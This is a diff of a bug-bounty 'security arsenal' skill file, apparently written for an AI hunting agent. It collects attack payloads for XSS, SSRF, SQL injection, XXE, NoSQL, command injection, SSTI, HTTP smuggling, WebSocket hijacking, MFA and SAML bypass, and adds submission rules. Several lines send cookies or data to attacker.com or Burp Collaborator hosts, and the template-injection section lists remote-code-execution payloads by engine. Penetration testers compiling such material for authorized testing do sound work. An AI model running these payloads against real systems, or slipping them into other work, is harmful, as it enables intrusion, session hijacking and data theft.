@@ -1,11 +1,16 @@
 ---
 name: security-arsenal-skill
 description: >
-  Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit.
+  Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and
+  conditionally-valid-with-chain table. Use when you need specific payloads for
+  XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA
+  bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what
+  NOT to submit.
 metadata:
   source: claude-bughunter
   original-name: security-arsenal
 ---
+
 # SECURITY ARSENAL
 
 Payloads, bypass tables, wordlists, and submission rules.
@@ -15,6 +20,7 @@ Payloads, bypass tables, wordlists, and submission rules.
 ## XSS PAYLOADS
 
 ### Basic Probes
+
 ```javascript
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(document.domain)>
@@ -25,6 +31,7 @@ javascript:alert(document.domain)
 ```
 
 ### Cookie Theft (proof of impact)
+
 ```javascript
 <script>document.location='https://attacker.com/c?c='+document.cookie</script>
 <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
@@ -32,6 +39,7 @@ javascript:alert(document.domain)
 ```
 
 ### CSP Bypass Techniques
+
 ```javascript
 // If unsafe-inline blocked — use fetch/XHR
 <img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
@@ -53,6 +61,7 @@ javascript:alert(document.domain)
 ```
 
 ### DOM XSS Sources and Sinks
+
 ```javascript
 // Sources (user-controlled input)
 location.hash
@@ -80,6 +89,7 @@ location.href = SOURCE
 ## SSRF PAYLOADS
 
 ### Cloud Metadata
+
 ```bash
 # AWS
 http://169.254.169.254/latest/meta-data/
@@ -98,6 +108,7 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
 
 ### Internal Service Fingerprinting
+
 ```bash
 http://localhost:6379      # Redis (unauthenticated, RESP protocol)
 http://localhost:9200      # Elasticsearch (/_cat/indices)
@@ -108,6 +119,7 @@ http://localhost:10.96.0.1:443  # Kubernetes API server
 ```
 
 ### SSRF IP Bypass Payloads
+
 ```bash
 # All of these map to 127.0.0.1:
 http://2130706433          # decimal
@@ -130,6 +142,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ## SQL INJECTION PAYLOADS
 
 ### Detection
+
 ```sql
 '
 ''
@@ -146,6 +159,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### Union-Based (determine column count)
+
 ```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
@@ -154,6 +168,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### Blind SQLi (time-based confirmation)
+
 ```sql
 # MySQL
 ' AND SLEEP(5)--
@@ -166,6 +181,7 @@ http://allowed-domain.com/redirect?to=http://169.254.169.254/
 ```
 
 ### WAF Bypass
+
 ```sql
 /*!50000 SELECT*/ * FROM users     -- MySQL inline comment
 SE/**/LECT * FROM users             -- comment injection
@@ -179,6 +195,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ## XXE PAYLOADS
 
 ### Classic File Read
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -186,6 +203,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### Blind OOB via HTTP (DNS confirmation)
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
@@ -193,6 +211,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### Blind OOB via DNS + Data Exfil
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -204,6 +223,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ```
 
 ### XXE via DOCX/SVG/PDF Upload
+
 - SVG: `<image href="file:///etc/passwd" />`
 - DOCX: malicious XML in `word/document.xml` with external entity
 
@@ -226,6 +246,7 @@ SeLeCt * FrOm uSeRs                -- case variation
 ## IDOR / AUTH BYPASS PAYLOADS
 
 ### Horizontal Privilege Escalation
+
 ```bash
 # Change numeric ID
 GET /api/user/123/profile → GET /api/user/124/profile
@@ -244,6 +265,7 @@ GET /api/orders → GET /api/orders?user_id=456
 ```
 
 ### Vertical Privilege Escalation
+
 ```bash
 # Parameter pollution
 POST /api/user/update
@@ -264,6 +286,7 @@ POST /api/user/update
 ## AUTHENTICATION BYPASS PAYLOADS
 
 ### JWT Attacks
+
 ```bash
 # None algorithm
 # Decode JWT, change alg to "none", remove signature
@@ -277,6 +300,7 @@ hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
 ```
 
 ### OAuth Attacks
+
 ```bash
 # Missing PKCE test
 GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
@@ -292,6 +316,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ## NOSQL INJECTION PAYLOADS (MongoDB)
 
 ### Operator Injection (JSON body)
+
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
@@ -301,6 +326,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ```
 
 ### GET Parameter Injection
+
 ```bash
 # URL parameter injection
 /login?username[$ne]=null&password[$ne]=null
@@ -315,6 +341,7 @@ GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
 ```
 
 ### Auth Bypass One-Liners
+
 ```bash
 curl -s -X POST https://target.com/api/login \
   -H "Content-Type: application/json" \
@@ -329,6 +356,7 @@ curl -s -X POST https://target.com/api/login \
 ## COMMAND INJECTION PAYLOADS
 
 ### Basic Detection
+
 ```bash
 ; id
 | id
@@ -343,6 +371,7 @@ $(sleep 5)
 ```
 
 ### Blind OOB (out-of-band confirmation)
+
 ```bash
 ; curl https://attacker.burpcollaborator.net
 ; nslookup attacker.burpcollaborator.net
@@ -352,6 +381,7 @@ $(nslookup attacker.burpcollaborator.net)
 ```
 
 ### Bypass Techniques
+
 ```bash
 # Bypass space filter
 ;{cat,/etc/passwd}
@@ -376,6 +406,7 @@ $(nslookup attacker.burpcollaborator.net)
 ```
 
 ### Context-Specific (filename injection)
+
 ```bash
 # File upload filenames
 test.jpg; id
@@ -390,6 +421,7 @@ test`id`.jpg
 ## SSTI DETECTION PAYLOADS (All Engines)
 
 ### Universal Probe (send all, observe which evaluate)
+
 ```
 {{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
 ${7*7}         → 49 = Freemarker (Java) or Spring EL
@@ -403,6 +435,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ### RCE Payloads by Engine
 
 **Jinja2 (Python/Flask/Django):**
+
 ```python
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
@@ -410,18 +443,21 @@ ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ```
 
 **Twig (PHP/Symfony):**
+
 ```php
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
 ```
 
 **Freemarker (Java):**
+
 ```
 ${"freemarker.template.utility.Execute"?new()("id")}
 <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
 ```
 
 **ERB (Ruby on Rails):**
+
 ```ruby
 <%= `id` %>
 <%= system("id") %>
@@ -429,17 +465,20 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 
 **Spring Thymeleaf:**
+
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('id')}
 __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
 ```
 
 **EJS (Node.js):**
+
 ```javascript
 <%= process.mainModule.require('child_process').execSync('id') %>
 ```
 
 ### Where to Test
+
 ```
 Name/bio/username fields, email subject templates, invoice/PDF generators,
 URL path parameters reflected in page, error messages, search query reflections,
@@ -451,6 +490,7 @@ HTTP headers that appear in rendered responses, notification templates
 ## HTTP SMUGGLING PAYLOADS
 
 ### CL.TE — Content-Length front-end, Transfer-Encoding back-end
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -463,6 +503,7 @@ SMUGGLED
 ```
 
 ### TE.CL — Transfer-Encoding front-end, Content-Length back-end
+
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -477,6 +518,7 @@ SMUGGLED
 ```
 
 ### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
+
 ```http
 # Obfuscate the TE header so one layer ignores it
 Transfer-Encoding: xchunked
@@ -492,6 +534,7 @@ Transfer-Encoding
 ```
 
 ### H2.CL — HTTP/2 front-end with Content-Length injection
+
 ```
 # In Burp Repeater, switch to HTTP/2
 # Add Content-Length header manually (not auto-set by HTTP/2)
@@ -500,6 +543,7 @@ Transfer-Encoding
 ```
 
 ### Detection (Burp)
+
 ```
 1. Install HTTP Request Smuggler extension
 2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
@@ -508,6 +552,7 @@ Transfer-Encoding
 ```
 
 ### Impact Chain
+
 ```
 Basic desync          → Capture victim's next request → Read their auth token
 + Admin user traffic  → Access admin as victim
@@ -519,6 +564,7 @@ Basic desync          → Capture victim's next request → Read their auth toke
 ## WEBSOCKET PAYLOADS
 
 ### IDOR / Auth Bypass
+
 ```javascript
 // Test: subscribe to other user's channel
 {"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
@@ -529,17 +575,19 @@ Basic desync          → Capture victim's next request → Read their auth toke
 ```
 
 ### Cross-Site WebSocket Hijacking (CSWSH)
+
 ```html
 <!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
 <script>
-var ws = new WebSocket('wss://target.com/ws');
-// Browser automatically sends victim's cookies
-ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
-ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
+  var ws = new WebSocket('wss://target.com/ws');
+  // Browser automatically sends victim's cookies
+  ws.onopen = () => ws.send(JSON.stringify({ action: 'getProfile' }));
+  ws.onmessage = (e) => fetch('https://attacker.com/?d=' + encodeURIComponent(e.data));
 </script>
 ```
 
 ### Test Origin Validation
+
 ```bash
 # Should reject non-target origins. If it doesn't = CSWSH vulnerability
 wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
@@ -548,6 +596,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 ```
 
 ### Injection via WS Messages
+
 ```javascript
 // XSS in chat/notification system
 {"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}
@@ -564,6 +613,7 @@ wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
 ## MFA / 2FA BYPASS PAYLOADS
 
 ### Pattern 1: OTP Brute Force (no rate limit)
+
 ```bash
 # Try all 6-digit OTPs
 ffuf -u "https://target.com/api/verify-otp" \
@@ -580,6 +630,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 ```
 
 ### Pattern 2: OTP Reuse (token not invalidated)
+
 ```
 1. Request OTP → receive "123456"
 2. Submit OTP correctly → authenticated
@@ -590,6 +641,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 ```
 
 ### Pattern 3: Response Manipulation
+
 ```
 Step 1: Enter wrong OTP → intercept response in Burp
 Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
@@ -598,6 +650,7 @@ Also try: change status code 401 → 200, or change redirect from /failed to /da
 ```
 
 ### Pattern 4: Code Predictability
+
 ```python
 import requests, time
 
@@ -611,12 +664,14 @@ for t_offset in range(-30, 31):  # Test ±30 seconds
 ```
 
 ### Pattern 5: Backup Codes Not Rate Limited
+
 ```bash
 # Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
 # Try brute force on /api/verify-backup-code if no rate limit
 ```
 
 ### Pattern 6: Skip MFA Step (Workflow Bypass)
+
 ```bash
 # After entering username/password, you get a session cookie
 # Test: skip the /mfa/verify step entirely, go directly to /dashboard
@@ -627,6 +682,7 @@ for t_offset in range(-30, 31):  # Test ±30 seconds
 ```
 
 ### Pattern 7: Race on MFA Verification
+
 ```python
 import asyncio, aiohttp
 
@@ -650,6 +706,7 @@ asyncio.run(race())
 ## SAML ATTACKS
 
 ### Attack 1: XML Signature Wrapping (XSW)
+
 ```xml
 <!-- Original valid assertion: -->
 <saml:Assertion ID="legit">
@@ -671,6 +728,7 @@ asyncio.run(race())
 ```
 
 ### Attack 2: Comment Injection in NameID
+
 ```xml
 <!-- Original: user@company.com -->
 <!-- Injected:  -->
@@ -681,6 +739,7 @@ asyncio.run(race())
 ```
 
 ### Attack 3: Signature Stripping
+
 ```
 1. Capture SAMLResponse (base64 decode from browser)
 2. Remove or modify the <Signature> element entirely
@@ -690,6 +749,7 @@ asyncio.run(race())
 ```
 
 ### Attack 4: XXE in SAML Assertion
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -701,6 +761,7 @@ asyncio.run(race())
 ```
 
 ### Tools
+
 ```bash
 # SAMLRaider (Burp extension) — most automated XSW testing
 # Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider
@@ -772,22 +833,23 @@ Autocomplete on password fields
 
 These are valid ONLY when combined with a chain that proves real impact:
 
-| Standalone Finding | Chain Required | Result if Chained |
-|---|---|---|
-| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
-| Clickjacking | + sensitive action + working PoC (not just login) | Medium |
-| CORS wildcard | + credentialed request exfils user data | High |
-| CSRF | + sensitive action (transfer funds, change email) | High |
-| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
-| SSRF DNS-only | + internal service access + data retrieval | Medium |
-| Host header injection | + password reset email uses it | High |
-| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
-| S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
-| Self-XSS | + CSRF to trigger it on victim | Medium |
-| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
-| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |
+| Standalone Finding    | Chain Required                                    | Result if Chained |
+| --------------------- | ------------------------------------------------- | ----------------- |
+| Open redirect         | + OAuth code theft via redirect_uri abuse         | ATO (Critical)    |
+| Clickjacking          | + sensitive action + working PoC (not just login) | Medium            |
+| CORS wildcard         | + credentialed request exfils user data           | High              |
+| CSRF                  | + sensitive action (transfer funds, change email) | High              |
+| Rate limit bypass     | + OTP/token brute force succeeding                | Medium/High       |
+| SSRF DNS-only         | + internal service access + data retrieval        | Medium            |
+| Host header injection | + password reset email uses it                    | High              |
+| Prompt injection      | + reads other user's data (IDOR) OR exfil OR RCE  | High              |
+| S3 bucket listing     | + JS bundles with API keys/OAuth secrets          | Medium/High       |
+| Self-XSS              | + CSRF to trigger it on victim                    | Medium            |
+| Subdomain takeover    | + OAuth redirect_uri registered at that subdomain | Critical          |
+| GraphQL introspection | + auth bypass mutation or IDOR on node()          | High              |
 
-**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.
+**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say
+"could chain with B" — prove it.
 
 ---
 
@@ -844,49 +906,87 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 
 ## Related Skills & Chains
 
-- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
-- **`triage-validation`** — When deciding if a finding is reportable at all. Workflow primitive: the "Always Rejected" and "Conditionally Valid — Requires Chain" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.
-- **`web2-recon`** — When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.
-- **`evidence-hygiene`** — When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.
-- **`bb-methodology`** — When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section of this arsenal to load.
+- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a
+  hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the
+  payload library those hunt-_ skills reach for; the hunt-_ skill identifies the sink, this skill
+  provides the syntax.
+- **`triage-validation`** — When deciding if a finding is reportable at all. Workflow primitive: the
+  "Always Rejected" and "Conditionally Valid — Requires Chain" tables in both skills must agree;
+  `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used
+  by Q7.
+- **`web2-recon`** — When the URL set has been classified by `gf` patterns. Workflow primitive:
+  `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf`
+  pattern names index directly into this skill's payload sections.
+- **`evidence-hygiene`** — When a payload produces output worth screenshotting. Workflow primitive:
+  after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for
+  redaction before the screenshot becomes evidence.
+- **`bb-methodology`** — When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase
+  3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section
+  of this arsenal to load.
 
 ---
 
 ## Operator Notes (Claude-BugHunter)
 
-> Engagement-derived + 2026-specific additions to the vendored foundation.
-> Wisdom from real authorized engagements + Phase 2 verification across
-> this repo's 31+ skill-area live tests. The upstream payload library
-> covers the WHAT; this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.
+> Engagement-derived + 2026-specific additions to the vendored foundation. Wisdom from real
+> authorized engagements + Phase 2 verification across this repo's 31+ skill-area live tests. The
+> upstream payload library covers the WHAT; this layer covers the WHEN-IT-WORKS-vs-WHEN-IT-DOESN'T.
 
 ### Payload freshness — what's gone stale by 2026
 
-The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx ≥ 1.21, Caddy 2.x, Envoy ≥ 1.20 (verified in Phase 2H). They DO still work against HAProxy ≤ 2.4, older F5 BIG-IP, Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first — `curl -sI` → `Server:` header + `Via:` chain + TLS JA3 — before burning hours on payloads that the parser already rejects at the front door.
+The classic CL.TE / TE.CL HTTP smuggling payloads no longer work against Nginx ≥ 1.21, Caddy 2.x,
+Envoy ≥ 1.20 (verified in Phase 2H). They DO still work against HAProxy ≤ 2.4, older F5 BIG-IP,
+Citrix ADC, AWS ALB-specific configs, and Apache Traffic Server. Fingerprint the front-end first —
+`curl -sI` → `Server:` header + `Via:` chain + TLS JA3 — before burning hours on payloads that the
+parser already rejects at the front door.
 
-Same story for XXE classic — Python lxml ≥ 5.x silently drops SYSTEM entities by default (Phase 2G finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The payload library still ships these — the operator decision is whether the target's parser is in the still-vulnerable set.
+Same story for XXE classic — Python lxml ≥ 5.x silently drops SYSTEM entities by default (Phase 2G
+finding). The payloads remain valid against: Java SAX, PHP DOMDocument with LIBXML_NOENT, .NET
+XmlDocument with XmlResolver still wired, older lxml (< 5.0), Ruby Nokogiri with DTDLOAD, and a long
+tail of embedded XML processors (SOAP libraries, SAML implementations, Office document parsers). The
+payload library still ships these — the operator decision is whether the target's parser is in the
+still-vulnerable set.
 
-Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>` (Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge); `data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in `Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a generic browser.
+Other stale-by-default-but-not-everywhere payloads as of 2026: `javascript:` URLs in `<a href>`
+(Chrome blocks unless explicit user gesture; works in embedded WebViews, Electron, older Edge);
+`data:text/html` for top-level navigation (modern browsers strip in nav contexts); CRLF injection in
+`Location:` (most reverse proxies normalize). Always test in the actual target environment, not in a
+generic browser.
 
 ### WAF evaluation order matters
 
 When multiple bypass payloads exist for the same WAF, the order to try is:
 
-1. **Encoding tricks** — case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
-2. **Parser quirks** — XML namespace, JSON `\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.
-3. **Protocol-level** — HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.
-4. **WAF rule-specific bypasses** — Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.
+1. **Encoding tricks** — case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode
+   escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
+2. **Parser quirks** — XML namespace, JSON `\u` escapes mid-keyword,
+   `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion,
+   multipart boundary tricks.
+3. **Protocol-level** — HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection,
+   `X-Original-URL`, `X-Forwarded-*` smuggling.
+4. **WAF rule-specific bypasses** — Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known
+   signature gaps; load the vendor-specific payload subsection.
 
-Most engagements end at step 2 — modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a "valid" request.
+Most engagements end at step 2 — modern WAFs trip on the parser-quirk class because the WAF and the
+origin app disagree on what's a "valid" request.
 
 ### OOB-Or-It-Didn't-Happen Gate applies everywhere
 
-Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab proved the gate kills FPs that look identical to real bugs at the surface — error messages with `you have an error in your SQL syntax` text in a 500 page can be parser logs from a different request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.
+Every blind primitive (blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE) needs OOB
+confirmation. Without it, you can't tell the bug from a parser-error log. Phase 2D's hardened lab
+proved the gate kills FPs that look identical to real bugs at the surface — error messages with
+`you have an error in your SQL syntax` text in a 500 page can be parser logs from a different
+request entirely, hit a Burp Collaborator domain (or interactsh) and confirm callback before filing.
 
-OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2) interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for long-running engagements).
+OOB callback infrastructure ranking by 2026: (1) Burp Collaborator (Pro license; cleanest), (2)
+interactsh-client (open source; comparable), (3) DNSLog.cn (free but logged by third party — never
+use for paid engagements), (4) self-hosted catch-all DNS + HTTP listener (most reliable for
+long-running engagements).
 
 ### Marker discipline
 
-Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript Tutorial" is not reflection — it's keyword overlap. Use unique random strings:
+Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript
+Tutorial" is not reflection — it's keyword overlap. Use unique random strings:
 
 ```
 m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
@@ -894,11 +994,16 @@ m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
 curl "https://target/search?q=${m}" | grep -c "$m"
 ```
 
-If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth — generic keywords lie.
+If the marker appears in the response, you have reflection. If it appears unescaped in HTML context,
+you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error,
+injection. The marker is the single source of truth — generic keywords lie.
 
 ### Statistical Sampling for noisy oracles
 
-Single-trial timing differentials are noise. Require n≥10 interleaved trials, Welch's t-statistic > 3, or equivalent confidence-interval separation. Phase 2D verified this against a deliberately-noisy timing oracle: single trial showed 129ms delta (which would have been filed); n=10 showed mean 78ms vs 191ms with t=5.26 (real, well-supported).
+Single-trial timing differentials are noise. Require n≥10 interleaved trials, Welch's t-statistic >
+3, or equivalent confidence-interval separation. Phase 2D verified this against a deliberately-noisy
+timing oracle: single trial showed 129ms delta (which would have been filed); n=10 showed mean 78ms
+vs 191ms with t=5.26 (real, well-supported).
 
 Skeleton for timing-side-channel validation:
 
@@ -911,4 +1016,5 @@ def welch_t(a, b):
 # interleave control + test trials, n=10 each, t > 3 = signal
 ```
 
-Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter — sample, don't assume.
+Same rule applies to blind boolean oracles where the diff is response-length or status-code under
+jitter — sample, don't assume.
